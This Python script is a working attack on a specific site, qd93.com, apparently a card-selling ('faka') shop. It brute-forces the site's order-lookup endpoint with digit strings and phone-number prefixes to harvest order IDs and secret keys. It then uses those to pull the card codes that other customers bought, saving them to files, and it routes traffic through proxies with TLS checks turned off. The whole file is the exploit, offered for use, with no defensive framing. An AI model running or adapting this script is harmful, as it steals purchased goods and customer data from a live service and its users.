#!/usr/bin/env python3
"""qd93.com full export: contact substring brute -> mod=faka cards."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://qd93.com/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
OUT_DIR = sys.argv[1] if len(sys.argv) > 1 else "/data/automation/results/qd93.com/deep_20260801"
DELAY = float(sys.argv[2]) if len(sys.argv) > 2 else 0.4

SHOW = re.compile(r"showOrder\((\d+),'([a-f0-9]{32})'")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def load_proxy():
    if os.environ.get("QD93_NO_PROXY") == "1":
        return None
    if os.environ.get("PROXY_URL"):
        u = os.environ["PROXY_URL"]
        return {"http": u, "https": u}
    for path in ("/data/config/proxy.env", "/tmp/proxy.env"):
        if os.path.isfile(path):
            for line in open(path):
                if line.startswith("PROXY_URL="):
                    u = line.strip().split("=", 1)[1].strip('"')
                    if u:
                        return {"http": u, "https": u}
    return None


def build_queries():
    qs = set()
    for i in range(10):
        qs.add(str(i))
    for i in range(100):
        qs.add(f"{i:02d}")
    for i in range(1000):
        qs.add(f"{i:03d}")
    for p in range(130, 200):
        qs.add(str(p))
    extras = [
        "123456", "1234567", "12345678", "123456789", "888888", "666666",
        "000000", "111111", "5201314", "123123", "86", "qq", "test",
    ]
    qs.update(extras)
    return sorted(qs, key=lambda x: (len(x), x))


def make_session():
    proxies = load_proxy()
    s = requests.Session()
    s.verify = False
    if proxies:
        s.proxies = proxies
    s.headers.update({"User-Agent": UA, "Referer": BASE})
    return s


def warm(s):
    for attempt in range(6):
        try:
            r = s.get(BASE, timeout=25)
            if len(r.text) > 5000:
                return True
        except Exception as e:
            print(f"warm {attempt}: {e}", flush=True)
            time.sleep(2 + attempt)
    return False


def extract_pairs(html):
    pairs = {}
    for m in SHOW.finditer(html):
        pairs[m.group(1)] = m.group(2)
    for m in FAKA.finditer(html):
        pairs[m.group(1)] = m.group(2)
    return pairs


def query_pairs(s, data):
    for attempt in range(4):
        try:
            r = s.get(BASE, params={"mod": "query", "data": data}, timeout=18)
            return extract_pairs(r.text)
        except Exception as e:
            wait = 15 + attempt * 20
            print(f"query fail data={data!r}: {e} sleep {wait}s", flush=True)
            time.sleep(wait)
            warm(s)
    return {}


def fetch_card(s, oid, skey):
    for attempt in range(3):
        try:
            r = s.get(
                BASE,
                params={"mod": "faka", "id": oid, "skey": skey},
                timeout=18,
            )
            if "非发卡类" in r.text:
                return None, "non-faka"
            m = CARD.search(r.text)
            if m:
                return m.group(1).strip(), "ok"
            return None, "empty"
        except Exception as e:
            if attempt < 2:
                warm(s)
                time.sleep(2)
            else:
                return None, str(e)
    return None, "fail"


def save_state(out_dir, pairs, cards, done_q):
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "pairs.json"), "w") as f:
        json.dump(pairs, f, indent=2)
    with open(os.path.join(out_dir, "cards.json"), "w") as f:
        json.dump(cards, f, ensure_ascii=False, indent=2)
    with open(os.path.join(out_dir, "qd93_cards.txt"), "w") as f:
        for c in cards.values():
            if c.get("card"):
                f.write(c["card"] + "\n")
    with open(os.path.join(out_dir, "done_queries.txt"), "w") as f:
        f.write("\n".join(sorted(done_q)))


def main():
    os.makedirs(OUT_DIR, exist_ok=True)
    pairs = {}
    cards = {}
    done_q = set()

    if os.path.exists(os.path.join(OUT_DIR, "pairs.json")):
        pairs = json.load(open(os.path.join(OUT_DIR, "pairs.json")))
    if os.path.exists(os.path.join(OUT_DIR, "cards.json")):
        cards = json.load(open(os.path.join(OUT_DIR, "cards.json")))
    if os.path.exists(os.path.join(OUT_DIR, "done_queries.txt")):
        done_q = set(open(os.path.join(OUT_DIR, "done_queries.txt")).read().splitlines())

    s = make_session()
    if not warm(s):
        raise RuntimeError("home fail")

    try:
        gc = s.get(BASE + "ajax.php?act=getcount", timeout=15).json()
        print("getcount", json.dumps(gc, ensure_ascii=False), flush=True)
    except Exception as e:
        gc = {"error": str(e)}

    queries = build_queries()
    total_q = len(queries)
    print(f"queries={total_q} existing_pairs={len(pairs)} delay={DELAY}", flush=True)

    for idx, q in enumerate(queries):
        if q in done_q:
            continue
        new = query_pairs(s, q)
        if new:
            pairs.update(new)
            print(
                f"[{idx+1}/{total_q}] data={q!r} +{len(new)} total_pairs={len(pairs)}",
                flush=True,
            )
        done_q.add(q)
        if len(done_q) % 25 == 0:
            save_state(OUT_DIR, pairs, cards, done_q)
        time.sleep(DELAY)

    print(f"scan done pairs={len(pairs)}", flush=True)
    save_state(OUT_DIR, pairs, cards, done_q)

    for oid, skey in sorted(pairs.items(), key=lambda x: int(x[0])):
        if oid in cards and cards[oid].get("card"):
            continue
        card, status = fetch_card(s, oid, skey)
        cards[oid] = {"id": oid, "skey": skey, "card": card, "status": status}
        if card:
            print(f"CARD {oid}: {card[:120]}", flush=True)
        time.sleep(DELAY)
        if int(oid) % 5 == 0:
            save_state(OUT_DIR, pairs, cards, done_q)

    save_state(OUT_DIR, pairs, cards, done_q)
    card_lines = [c["card"] for c in cards.values() if c.get("card")]
    stats = {
        "target": "qd93.com",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "getcount": gc,
        "pairs": len(pairs),
        "cards_ok": len(card_lines),
        "cards_skip": sum(1 for c in cards.values() if not c.get("card")),
        "queries_done": len(done_q),
    }
    with open(os.path.join(OUT_DIR, "STATS.json"), "w") as f:
        json.dump(stats, f, ensure_ascii=False, indent=2)
    print("DONE", json.dumps(stats, ensure_ascii=False), flush=True)


if __name__ == "__main__":
    main()
